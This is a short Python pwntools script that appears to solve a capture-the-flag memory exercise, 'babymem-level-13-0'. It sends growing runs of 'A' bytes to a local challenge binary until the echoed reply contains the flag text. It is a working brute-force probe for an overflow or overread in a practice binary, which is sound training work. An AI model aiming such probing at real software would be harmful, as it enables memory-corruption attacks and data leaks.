from pwn import *


for offset in range(1, 300):
    print(f'try {offset}:')
    proc = process('/challenge/babymem-level-13-0')
    proc.recv()
    proc.recvuntil(b'size: ')
    proc.sendline(str(offset).encode())
    proc.recv()
    proc.sendline(b'A' * offset)
    proc.recvuntil('said: ')
    r = proc.recvline()
    if b'pwn' in r:
        print(r)
        break
